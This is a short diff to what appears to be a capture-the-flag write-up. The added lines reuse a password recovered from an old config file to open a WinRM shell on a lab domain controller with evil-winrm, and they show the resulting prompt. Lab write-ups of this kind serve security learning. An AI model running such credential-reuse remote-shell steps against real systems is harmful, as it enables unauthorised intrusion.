@@ -586,4 +586,14 @@ cat .old-conf.xml
  <password>R4v3nBe5tD3veloP3r!123</password>
 ```
 
+This gives us access to WinRM:
 
+```
+evil-winrm -i 10.129.116.131 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+```
+
+Success, we have a shell on the DC:
+
+```
+*Evil-WinRM* PS C:\Users\Raven\Documents> 
+```
